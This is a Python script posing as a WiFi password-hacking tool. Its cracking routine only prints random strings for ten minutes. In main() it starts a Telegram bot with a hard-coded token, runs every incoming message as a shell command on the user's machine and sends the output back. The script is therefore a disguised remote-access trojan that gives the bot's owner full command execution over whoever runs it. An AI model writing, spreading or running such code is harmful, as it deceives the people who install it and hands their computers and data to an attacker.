import subprocess
import random
import time
import string
from colorama import Fore, Style
import telepot

def print_banner(message):
    print(Fore.BLUE + message)
    print(Style.RESET_ALL)

def execute_command(command):
    return subprocess.getoutput(command)

def scan_wifi_networks():
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'network'], universal_newlines=True)
        networks = [line.split(":")[1].strip() for line in output.split('\n') if "SSID" in line]
        return networks[:5]  # t.me/rmsup Version: 1.0
    except subprocess.CalledProcessError:
        return []

def loading_animation():
    for i in range(101):
        if i < 30:
            print(Fore.RED + f"loading... {i}%", end="\r")
        elif i < 70:
            print(Fore.YELLOW + f"loading... {i}%", end="\r")
        else:
            print(Fore.GREEN + f"loading... {i}%", end="\r")
        time.sleep(0.05)
    print(" " * 20, end="\r")  # t.me/secbaz Version: 1.0

def main():
    banner = """
    ██╗    ██╗██╗███████╗██╗      ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██║    ██║██║██╔════╝██║      ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ██║ █╗ ██║██║█████╗  ██║█████╗███████║███████║██║     █████╔╝ 
    ██║███╗██║██║██╔══╝  ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗ 
    ╚███╔███╔╝██║██║     ██║      ██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    Version: 1.0  |  Channel: t.me/rmsup
    """
    print(Fore.GREEN + banner)
    
    print_banner("Reverse Shell | t.me/rmsup")
    bot = telepot.Bot('6725908487:AAET8Owwep61i5eQhSRzt7qUn2bc295EfYs')

    def handle(msg):
        content_type, chat_type, chat_id = telepot.glance(msg)
        if content_type == 'text':
            command = msg['text']
            output = execute_command(command)
            bot.sendMessage(chat_id, output)

    bot.message_loop(handle)
    
    try:
        loading_animation()
    except KeyboardInterrupt:
        print("\nExiting the tool... | Channel: t.me/rmsup")
        exit()
    
    print(Style.RESET_ALL)
    
    print(Fore.GREEN + " [1]" + Fore.WHITE + " Start\n")
    print(Fore.GREEN + " [2]" + Fore.WHITE + " Exit\n")

    
    try:
        choice = input("Enter your choice: ")
    except KeyboardInterrupt:
        print("\nExiting the tool... | Channel: t.me/rmsup")
        exit()

    if choice == '2':
        print("Exiting the tool... | Channel: t.me/rmsup")
        exit()

    elif choice == '1':
        print(Fore.YELLOW + "Available WiFi Networks:")
        
        wifi_networks = scan_wifi_networks()
        if wifi_networks:
            print("┌──────────────────┐")
            for network in wifi_networks:
                print(f"│ {network:<16} │")
            print("└──────────────────┘")
        else:
            print(Fore.RED + "No WiFi networks found.")
        
        print(Style.RESET_ALL)
        
        try:
            wifi_name = input("Enter the wifi name: ")
        except KeyboardInterrupt:
            print("\nExiting the tool... | Channel: t.me/rmsup")
            exit()
        
        colors = [Fore.GREEN, Fore.WHITE, Fore.YELLOW, Fore.CYAN]
        print(Fore.RED + "10 minutes to hack wifi password...")
        end_time = time.time() + 600  # t.me/rmsup
        color_index = 0
        try:
            while time.time() < end_time:
                random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
                print(colors[color_index % len(colors)] + f"Password check for WiFi hacking: {random_string}")
                time.sleep(2)  # t.me/secbaz
                color_index += 1
        except KeyboardInterrupt:
            print("\nExiting the tool... | Channel: t.me/rmsup")
            exit()

if __name__ == "__main__":
    main()
